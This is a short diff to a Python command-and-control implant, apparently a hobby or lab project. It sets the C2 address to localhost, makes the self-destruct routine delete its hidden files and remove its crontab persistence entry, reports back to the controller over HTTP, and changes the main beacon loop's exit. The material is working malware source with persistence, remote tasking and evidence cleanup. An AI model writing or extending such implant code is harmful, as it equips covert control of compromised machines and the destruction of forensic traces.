@@ -6,6 +6,8 @@ import subprocess
 import sys
 
 #Comms
+c2 = 'http://localhost:63412'
+c2IPAdress = 'localhost'
 implantDir = os.getcwd()
 
 #This will upload a file to the target server.
@@ -26,7 +28,7 @@ def UpdateImplant(implantDir):
 def SelfDestruct(implantDir):
     #urllib.request.urlopen(f'{c2}/destruct?sid={sid}')
     os.system(f'crontab -l | grep -v "{implantDir}/.implant.py"  | crontab -')
-    os.system(f'rm {implantDir}/implant.py')
+    os.system(f'rm {implantDir}/.sid.log; rm {implantDir}/.implant.py')
     destructMsg = urllib.parse.quote_plus("Implant has self destructed")
     urllib.request.urlopen(f'{c2}/info?info={destructMsg}&sid={sid}')
     return
@@ -113,7 +115,7 @@ while True:
             Cron()
         elif next[0] == 'selfdestruct':
             SelfDestruct(implantDir)
-            break
+            quit()
         else:
             time.sleep(10)
         time.sleep(5)
